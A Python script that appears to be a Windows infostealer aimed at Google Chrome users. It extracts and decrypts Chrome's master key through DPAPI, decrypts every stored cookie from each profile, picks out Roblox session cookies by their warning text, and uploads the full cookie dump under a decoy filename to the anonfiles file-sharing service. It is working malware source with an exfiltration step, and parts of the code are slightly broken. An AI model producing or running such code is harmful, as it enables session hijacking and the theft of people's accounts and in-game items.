import os
import ntpath
import re
import random
import shutil
import sqlite3
import requests
from tempfile import gettempdir
from Crypto.Cipher import AES
from base64 import b64decode
from json import loads
from win32crypt import CryptUnprotectData

def win_decrypt(encrypted_str: bytes) -> str:
    return CryptUnprotectData(encrypted_str, None, None, None, 0)[1]

def get_master_key(path: str or os.PathLike):
    if not ntpath.exists(path):
        return None
    with open(path, "r", encoding="utf-8") as f:
        c = f.read()
    local_state = loads(c)

    try:
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        return win_decrypt(master_key[5:])
    except KeyError:
        return None

chrome_reg = re.compile(r'(^profile\s\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE)
chrome_user_data = ntpath.join(os.getenv("localappdata"), 'Google', 'Chrome', 'User Data')
chrome_key = get_master_key(ntpath.join(chrome_user_data, "Local State"))

def create_temp_file(_dir: str or os.PathLike = gettempdir()):
    file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
    path = ntpath.join(_dir, file_name)
    open(path, "x")
    return path

def decrypt_val(buff, master_key) -> str:
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception:
        return f'Failed to decrypt "{str(buff)}" | key: "{str(master_key)}"'


def grabCookies():
    robloxcookies = []

    result = create_temp_file()

    f = open('result.txt', 'w', encoding="cp437", errors='ignore')
    for prof in os.listdir(chrome_user_data):
        if re.match(chrome_reg, prof):
            login_db = ntpath.join(chrome_user_data, prof, 'Network', 'cookies')
            login = create_temp_file()

            shutil.copy2(login_db, login)
            conn = sqlite3.connect(login)
            conn.text_factory = bytes
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value from cookies")

            for r in cursor.fetchall():
                host = r[0]
                user = r[1]
                decrypted_cookie = decrypt_val(r[2], chrome_key)
                if host != "":
                    f.write(f"HOST KEY: {host} | NAME: {user} | VALUE: {decrypted_cookie}\n")
                if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
                    robloxcookies.append(decrypted_cookie)

            cursor.close()
            conn.close()
            os.remove(login)
    f.close()

    return f, robloxcookies

def get_and_upload() -> list:
    cookies = grabCookies()

    _f = cookies[0]
    robloxcookies = cookies[1]

    files = {
        'file': ('podzol_block.txt', open(_f, 'rb')),
    }

    url = 'https://api.anonfiles.com/upload'
    response = requests.post(url, files=files)

    data = response.json()

    return data['data']['file']['url']['short'], robloxcookies